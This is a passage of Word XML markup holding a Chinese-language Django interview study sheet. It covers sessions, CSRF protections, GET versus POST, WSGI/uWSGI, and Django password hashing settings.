      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的对比、设置、获取、清空</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459F11A8" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Session是服务器端技术，利用这个技术，服务器在运行时可以 为每一个用户的浏览器创建一个其独享的session对象，由于 session为用户浏览器独享，所以用户在访问服务器的web资源时 ，可以把各自的数据放在各自的session中，当用户再去访问该服务器中的其它web资源时，其它web资源再从用户各自的session中 取出数据为用户服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02753DFD" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> request.session["is_login"] = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D7D239" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> is_login = request.session.get("is_login")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6508D955" w14:textId="00FCF306" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> request.session.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28729857" w14:textId="0893932C" w:rsidR="00717181" w:rsidRPr="00325D76" w:rsidRDefault="00B73D4C"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054</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，及防范方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4AFFDF" w14:textId="5A4B7EC1" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>启用中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B46FCAF" w14:textId="4F948510" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>post请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5883EA" w14:textId="106F817D" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>验证码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676A2E41" w14:textId="1A69219C" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>表单中添加{%csrf_token%}标签</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025340FE" w14:textId="114C024F" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00B73D4C" w:rsidP="00467BD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055</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请求和</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请求的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF0F031" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>请求方式: get与post请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3B702F" w14:textId="5AD64487" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditBook?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4B602A" w14:textId="1D32DC6E" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET提交的</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>数据大小</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B501B9" w14:textId="6BF770B6" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET与POST请求在服务端获取请求数据方式不同。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE2C3F7" w14:textId="75B97DAC" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB4465C" w14:textId="0864DD86" w:rsidR="00717181" w:rsidRDefault="00B73D4C" w:rsidP="00717181">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056</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>图书管理系统的表结构是怎么设计的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132B13B1" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图书管理系统路由系统你用到了name了吗？ 为什么要使用呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FCF01D" w14:textId="37081A81" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图书管理系统的模板你是怎么用的？ 重复的代码怎么解决？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE5D0BA" w14:textId="2CD1DD01" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00B73D4C" w:rsidP="00557AFE">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057</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>WSGI / uwsgi/ uWSGI</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>区分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21851B41" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A73627C" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>WSGI的全称是Web Server Gateway Interface（Web服务器网关接口），它不是服务器、python模块、框架、API或者任何软件，只是一种描述web服务器（如nginx，uWSGI等服务器）如何与web应用程序（如用Django、Flask框架写的程序）通信的规范。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0795E8AC" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>server和application的规范在PEP3333中有具体描述，要实现WSGI协议，必须同时实现web server和web application，当前运行在WSGI协议之上的web框架有Bottle, Flask, Django。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0BB5C0" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6548411E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    uWSGI是一个全功能的HTTP服务器，实现了WSGI协议、uwsgi协议、http协议等。它要做的就是把HTTP协议转化成语言支持的网络协议。比如把HTTP协议转化成WSGI协议，让Python可以直接使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF708D9" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uwsgi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C69400" w14:textId="3EBD7310" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>  与WSGI一样，是uWSGI服务器的独占通信协议，用于定义传输信息的类型(type of information)。每一个uwsgi packet前4byte为传输信息类型的描述，与WSGI协议是两种东西，据说该协议是fcgi【FCGI：fast common gateway interface 快速通用网关接口协议的10倍快。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E288017" w14:textId="64BCD9BF" w:rsidR="00717181" w:rsidRDefault="00B73D4C" w:rsidP="00B73D4C">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>058</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00B73D4C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何使用</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00B73D4C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00B73D4C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>加密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C6E61E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django 内置的User类提供了用户密码的存储、验证、修改等功能，默认使用pbkdf2_sha256方式来存储和管理用的密码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1727C840" w14:textId="30F1FBB7" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django通过setting.py文件中的PASSWORD_HASHERS来设置选择要使用的算法，列表的第一个元素 (即settings.PASSWORD_HASHERS[0]) 会用于储存密码， 所有其它元素都是用于验证的哈希值，它们可以用于检查现有的密码。意思是如果你打算使用不同的算法，你需要修改PASSWORD_HASHERS，来将你最喜欢的算法在列表中放在首位。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7B4C91" w14:textId="57DFC86C" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个settings中的Password_hashers看起来是这样的：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D338000" w14:textId="422E532C" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>PASSWORD_HASHERS = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC27304" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    'django.contrib.auth.hashers.PBKDF2PasswordHasher',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC33354" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    'django.contrib.auth.hashers.PBKDF2SHA1PasswordHasher',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1494CCF3" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    'django.contrib.auth.hashers.BCryptSHA256PasswordHasher',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8738EE" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
